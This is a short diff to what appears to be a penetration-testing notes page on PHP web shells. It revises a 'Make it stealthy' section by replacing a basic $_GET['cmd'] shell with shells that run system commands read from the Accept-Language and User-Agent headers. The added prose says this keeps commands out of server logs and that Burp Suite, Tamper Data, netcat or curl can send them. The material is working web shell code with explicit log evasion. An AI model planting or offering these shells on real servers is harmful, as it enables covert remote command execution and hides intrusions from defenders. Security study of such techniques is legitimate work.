@@ -42,10 +42,13 @@ http://192.168.1.103/index.php?cmd=pwd
 ```
 
 ### Make it stealthy
-We can make the commands from above a bit more stealthy.
+
+We can make the commands from above a bit more stealthy. Instead of passing the cmds through the url, which will be obvious in logs, we cna pass them through other header-paramters. The use tampterdata or burpsuite to insert the commands. Or just netcat or curl.
 
 ```php
-<?php system($_GET['cmd']); ?>
+
+<?php system($_SERVER['HTTP_ACCEPT_LANGUAGE']); ?>
+<?php system($_SERVER['HTTP_USER_AGENT'])?>
 
 
 ```
